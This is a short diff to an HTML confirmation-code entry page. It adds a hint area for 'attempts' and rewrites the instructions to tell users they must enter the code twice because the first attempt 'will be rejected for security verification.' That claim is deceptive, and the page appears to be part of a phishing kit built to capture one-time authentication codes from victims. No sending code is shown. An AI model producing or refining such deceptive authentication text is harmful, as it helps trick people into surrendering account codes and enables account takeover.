@@ -89,6 +89,9 @@
                   autofocus
                 >
 
+                <!-- Info text area for attempts -->
+                <p class="auth-hint" id="enter-code-info"></p>
+
                 <div class="auth-actions">
                   <a href="index.html" class="button button-cancel"><span>Cancel</span></a>
                   <button type="button" class="button button-resend" id="resend-code-btn">
@@ -103,8 +106,8 @@
 
             <div class="auth-info" role="note">
               <span class="auth-info__icon" aria-hidden="true">i</span>
-              <p id="enter-code-info">
-                Enter the confirmation code you received. If you did not receive a code, press Resend Code.
+              <p id="enter-code-note">
+                Enter the confirmation code you received. <strong>You will need to enter it twice</strong> - the first attempt will be rejected for security verification.
               </p>
             </div>
           </div>
